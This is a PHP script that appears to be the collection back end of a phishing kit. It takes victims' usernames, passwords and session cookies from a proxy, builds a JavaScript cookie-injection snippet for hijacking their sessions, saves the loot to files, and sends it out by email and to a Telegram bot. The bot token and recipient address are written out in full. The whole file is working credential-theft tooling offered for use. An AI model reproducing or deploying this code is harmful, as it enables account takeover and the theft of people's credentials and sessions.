<?php
ini_set('display_startup_errors', 1);
ini_set('display_errors', 1);
error_reporting(-1);
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: x-test-header, Origin, X-Requested-With, Content-Type, Accept");
////////////////////////////////////////////////////////////////////////////////

$send = "loftus.cheeks@protonmail.com"; // YOUR EMAIL GOES HERE
$Send_Log  = 1; // SEND RESULTS TO EMAIL
$Save_Log  = 1; // SAVE RESULTS TO CPANEL
$Tele_bot  = 1; //SENDS RESULTS TO TELEGRAM
$bot_token = "5399100710:AAFiDF-vMLu62C9vNMdyCq5yQULalbX-jRE"; // BOT TOKEN
$chat_id   = "-1002440209591"; // GROUP CHAT ID

////////////////////////////////////////////////////////////////////////////////

function file_get_contents_curl($url)
{$ch = curl_init();
    curl_setopt($ch, CURLOPT_AUTOREFERER, false);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $data = curl_exec($ch);
    curl_close($ch);return $data;}

function sendOutput($chat_id, $bot_token, $output, $filetype, $name)
{
    $tempFilePath = tempnam(sys_get_temp_dir(), 'output_');
    file_put_contents($tempFilePath, $output);

    $content = array('chat_id' => $chat_id, 'document' => new CURLFile(realpath($tempFilePath), $filetype, $name));

    $curl = curl_init();
    curl_setopt($curl, CURLOPT_HEADER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_URL, "https://api.telegram.org/bot" . $bot_token . "/sendDocument");
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $content);
    $json_response = curl_exec($curl);
    curl_close($curl);
    unlink($tempFilePath);
    return json_decode($json_response, true);
}

$responseBody = file_get_contents('php://input');
$res = json_decode($responseBody, true);
if ($res) {$id = $res['id'];
    $phishlet = $res['phishlet'];
    $username = $res['username'];
    $password = $res['password'];
    $tokens = [];
    foreach ($res['tokens'] as $name => $value) {
        foreach ($value as $name2 => $value2) {
            $topush = [
                "name" => "$name2",
                "path" => "{$value2['Path']}",
                "value" => "{$value2['Value']}",
                "domain" => "{$name}",
                "secure" => "{$value2['HttpOnly']}",
            ];
            $tokens[] = $topush;
        }
    }
    $log = [$username => $password];
    $finalArray = ['tokens' => $tokens];
    $finalArray2 = ['log' => $log];
    $cookie = array_merge($finalArray, $finalArray2);
    $final = json_encode($cookie, true);

    $ip = $res['remote_addr'];
    $res = json_decode($final, true);
    $mg2 = '(async () => {
    let cookies = [';
    foreach ($res['tokens'] as $key) {
        if ($key['secure'] == 1) {
            $httponly = "true";
        } else {
            $httponly = "null";
        }
        $mg2 .= '{
    "name": "' . $key['name'] . '",
    "path": "' . $key['path'] . '",
    "value": "' . $key['value'] . '",
    "domain": "' . $key['domain'] . '",
    "secure": true,
    "httponly": ' . $httponly . '
  },';
    }
    $mg2 .= ']
    var red = "color:red; font-size:65px; font-weight:bold; -webkit-text-stroke: 1px black";
    function setCookie(key, value, domain, path, isSecure, sameSite) {
        const cookieMaxAge = \'Max-Age=31536000\' // set cookies to one year
         if (!!sameSite) {
           cookieSameSite = sameSite;
        } else {
           cookieSameSite = \'None\';
        }
        if (isSecure) {
                if (window.location.hostname == domain) {
                    document.cookie = `${key}=${value};${cookieMaxAge}; path=${path}; Secure; SameSite=${cookieSameSite}`;
             } else {
                    document.cookie = `${key}=${value};${cookieMaxAge};domain=${domain};path=${path};Secure;SameSite=${cookieSameSite}`;
            }
            } else {
                if (window.location.hostname == domain) {
                    document.cookie = `${key}=${value};${cookieMaxAge};path=${path};`;
                } else {
                    document.cookie = `${key}=${value};${cookieMaxAge};domain=${domain};path=${path};`;
                }
            }
    }
    for (let cookie of cookies) {
        setCookie(cookie.name, cookie.value, cookie.domain, cookie.path, cookie.secure)
    }
    console.log(\'%cCOOKIE INJECTED\', red);
	location.reload();
})();';

    $cookie_encoded = base64_encode($final);
    $mg = "SID: $id $username:$password\n\n";
    $mg .= "Cookie: $cookie_encoded\n\n";
    $subject = "$phishlet | $ip";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/plain; charset=utf-8\r\n";if ($username != "" && $password != "") {if ($Save_Log == 1) {$file = fopen("rez/$username.txt", "a");
        fwrite($file, $mg2);
        fclose($file);}
        if ($Send_Log == 1) {mail($send, $subject, $mg, $headers);}
        if ($Tele_bot == 1) {$result = $mg;

            $response = sendOutput($chat_id, $bot_token, $result, "text/plain", $username . ".txt");}

    }}
